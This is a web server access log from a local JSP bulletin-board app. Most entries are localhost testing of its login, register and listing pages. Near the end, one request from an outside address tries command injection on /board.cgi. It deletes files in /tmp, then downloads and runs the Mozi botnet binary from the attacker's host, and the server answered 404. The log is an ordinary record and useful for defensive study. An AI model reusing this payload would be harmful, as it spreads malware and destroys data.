127.0.0.1 - - [27/Nov/2021:22:24:55 +0900] "GET / HTTP/1.1" 404 807
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:04 +0900] "GET /BBS/execute.jsp?process=getCardList HTTP/1.1" 200 1110
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:04 +0900] "GET /BBS/execute.jsp?iftmSeq=0&process=getRegionList HTTP/1.1" 200 526
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:05 +0900] "GET /BBS/login.jsp HTTP/1.1" 200 980
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:06 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1898
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:29 +0900] "POST /BBS/execute.jsp?process=register HTTP/1.1" 200 222
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:29 +0900] "GET /BBS/index.jsp HTTP/1.1" 200 104271
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:29 +0900] "GET /BBS/execute.jsp?process=getCardList HTTP/1.1" 200 1110
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:29 +0900] "GET /BBS/execute.jsp?iftmSeq=0&process=getRegionList HTTP/1.1" 200 526
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:45 +0900] "GET /BBS/login.jsp HTTP/1.1" 200 980
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:46 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1898
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:52 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1898
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:52 +0900] "GET /BBS/style/style.css HTTP/1.1" 200 2761
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:52 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:53 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1898
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:53 +0900] "GET /BBS/style/style.css HTTP/1.1" 200 2761
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:53 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:54 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1898
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:54 +0900] "GET /BBS/style/style.css HTTP/1.1" 200 2761
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:25:54 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:03 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1897
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:22 +0900] "GET /BBS/register.jsp HTTP/1.1" 200 1905
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:22 +0900] "GET /BBS/style/style.css HTTP/1.1" 200 2761
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:22 +0900] "GET /favicon.ico HTTP/1.1" 404 818
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:39 +0900] "POST /BBS/execute.jsp?process=register HTTP/1.1" 200 222
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:40 +0900] "GET /BBS/index.jsp HTTP/1.1" 200 104271
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:40 +0900] "GET /BBS/execute.jsp?process=getCardList HTTP/1.1" 200 1110
0:0:0:0:0:0:0:1 - - [27/Nov/2021:22:26:40 +0900] "GET /BBS/execute.jsp?iftmSeq=0&process=getRegionList HTTP/1.1" 200 526
64.62.197.62 - - [27/Nov/2021:23:02:36 +0900] "GET / HTTP/1.1" 404 807
198.98.49.124 - - [27/Nov/2021:23:26:21 +0900] "GET / HTTP/1.1" 404 766
117.222.164.47 - - [27/Nov/2021:23:37:38 +0900] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.222.164.47:37705/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 816
120.52.152.5 - - [27/Nov/2021:23:59:47 +0900] "-" 400 2163
120.52.152.5 - - [27/Nov/2021:23:59:47 +0900] "GET / HTTP/1.0" 404 807
